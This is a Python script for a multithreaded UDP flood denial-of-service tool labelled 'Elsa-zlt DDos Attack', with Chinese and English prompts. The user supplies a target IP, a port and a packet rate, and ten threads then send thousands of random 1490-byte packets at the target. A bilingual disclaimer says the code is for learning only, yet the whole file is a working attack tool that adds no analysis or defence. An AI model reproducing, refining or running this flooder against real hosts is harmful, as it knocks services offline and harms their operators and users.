import os
import datetime
import random
import socket
import threading
import time
from queue import Queue

def show_progress(percentage):
    bar_length = 20
    filled_length = int(bar_length * percentage / 100)
    bar = '=' * filled_length + ' ' * (bar_length - filled_length)
    print(f"[{bar}] {percentage}%")

now = datetime.datetime.now()

now = datetime.datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("figlet Elsa-zlt DDos Attack")
print()
print("Author   : BohanHou")
print("未经授权对目标进行 DDoS 攻击是违法且不道德的行为，可能会导致严重的法律后果。此代码仅用于学习和研究网络编程及安全防御相关知识，请勿用于非法活动。")
print("Unauthorized DDoS attacks on targets are illegal and unethical and can lead to serious legal consequences. This code is only for learning and researching network programming and security related knowledge, and should not be used for illegal activities.")
print()

ip = input("IP Target : ")

while True:
        port = input("Port       : ")
        try:
            port = int(port)
            break
        except ValueError:
            print("输入的端口号无效，请输入一个整数。")

while True:
        speed = input("攻击速度 (数据包/秒): ")
        try:
            packets_per_second = int(speed)
            if packets_per_second <= 0:
                print("速度必须大于0")
            else:
                break
        except ValueError:
            print("输入无效，请输入一个整数。")

os.system("clear")
os.system("figlet Elsa-zlt DDos Attack")
print(f"目标: {ip}:{port}")
print(f"攻击速度: {packets_per_second} 数据包/秒")
print("准备中...")

for i in range(0, 101, 25):
        show_progress(i)
        time.sleep(0.5)  # 加速准备进度显示

    # 计算每个线程的发送间隔 (毫秒)
thread_count = 10
interval = 1.0 / packets_per_second * thread_count

packet_queue = Queue()
    # 预生成大量数据包
for _ in range(10000):
        packet_queue.put(random._urandom(1490))

def attack_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent_count = 0
        start_time = time.time()

        while not packet_queue.empty():
            try:
                packet = packet_queue.get()
                sock.sendto(packet, (ip, port))
                sent_count += 1

                # 速度控制
                elapsed = time.time() - start_time
                expected_elapsed = sent_count * interval
                if elapsed < expected_elapsed:
                    time.sleep(expected_elapsed - elapsed)

                # 每100个包显示一次进度
                if sent_count % 100 == 0:
                    current_speed = sent_count / (time.time() - start_time)
                    print(f"\r已发送: {sent_count} 数据包 | 当前速度: {current_speed:.1f} PPS", end="")

            except Exception as e:
                print(f"\n线程出错: {e}")
            finally:
                packet_queue.task_done()

    # 创建并启动多个攻击线程
print("\n启动攻击线程...")
threads = []
for i in range(thread_count):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"线程 {i + 1}/{thread_count} 已启动")
        time.sleep(0.1)  # 线程启动间隔，避免系统过载

    # 等待所有线程完成
print("\n攻击进行中，按 Ctrl+C 停止...")
try:
        for t in threads:
            t.join()
except KeyboardInterrupt:
        print("\n用户中断，正在停止攻击...")

print("\n攻击已停止")
